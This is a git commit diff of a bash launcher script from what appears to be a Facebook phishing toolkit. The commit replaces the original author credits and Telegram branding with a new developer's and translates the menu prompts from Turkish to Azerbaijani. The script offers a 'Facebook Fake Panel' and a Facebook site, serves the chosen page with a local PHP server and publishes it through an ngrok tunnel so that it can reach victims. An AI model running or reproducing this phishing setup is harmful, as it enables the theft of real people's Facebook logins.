d2f77fa300db3f8e411c4261101e66b5b4a5c1dd
Nihat 「 FARZ 」 <99778063+NihatFarz@users.noreply.github.com>
2022-03-09 02:32:41 +0400

    「 FARZ 」

--- Site/Facebook/start.sh
+++ Site/Facebook/start.sh
@@ -3,15 +3,14 @@ start.sh
 
 #!/bin/bash
 
-#Code:Yaman Efkar
-#Türk Siber Timi
-#İnstagram : @turksibertimi
-#Youtube : YamanEfkar
+#Developer:Nihat 「 FARZ 」
+#İnstagram : @NihatFarz
+#Telegram : NihatFarz
 clear
 echo -e  "
 
 
-\e[35m     ((( #Türk Siber Timi  #Yaman Efkar )))
+\e[35m     ((( Telegram  @MaragliWeb )))
 
 
 
@@ -19,42 +18,42 @@ echo -e  "
 \e[31m[02]\e[32m Facebook Fake Panel
 
 
-\e[31m[00]\e[37m Menü
-\e[31m[99]\e[37m Exit
+\e[31m[00]\e[37m Menyu
+\e[31m[99]\e[37m Çıxış
 "
 echo -e "\e[49m"
-read -p "İşlem Numarasını Giriniz: " islem
+read -p "Seçim Edin: " islem
 if [[ $islem == 1 || $islem == 01 ]]; then
-        read -p "Port Giriniz: " port
+        read -p "Port Girin: " port
         echo -e "\e[32mCode: face01"
         sleep 2
         echo ""
-        echo -e "\e[33mPhp Server && Ngrok Service Başlatılıyor..."
+        echo -e "\e[33mPhp Server && Ngrok Service Başladılır..."
         sleep 4
         cd Site-facebook/
         php -S 127.0.0.1:$port > -t & ngrok http $port
 elif [[ $islem == 2 || $islem == 02 ]]; then
-        read -p "Port Giriniz: " port
+        read -p "Port Girin: " port
         echo -e "\e[32mCode: face02"
         sleep 2
         echo ""
-        echo -e "\e[33mPhp Server && Ngrok Service Başlatılıyor..."
+        echo -e "\e[33mPhp Server && Ngrok Service Başladılır..."
         sleep 4
         cd Site-fakepanel/
         php -S 127.0.0.1:$port > -t & ngrok http $port
 elif [[ $islem == 0 || $islem == 00 ]]; then
 cd ..
 cd ..
-bash tst.sh
+bash farz.sh
 elif [[ $islem == 9 || $islem == 99 ]]; then
 clear
-echo -e "\e[31mTürk Siber Timi İyi Günler Diler :)) ßß"
+echo -e "\e[31mKanalımızı İzləmədə qalın @MaragliWeb :)) ßß"
 clear
 sleep 1
 exit 1
 else
 echo ""
-echo -e "\e[31m Girdiğiniz İşlem Numarasını Kontrol Ediniz...."
+echo -e "\e[31m Seçiminizi düzgün edin...."
 sleep 3
 clear
 bash start.sh
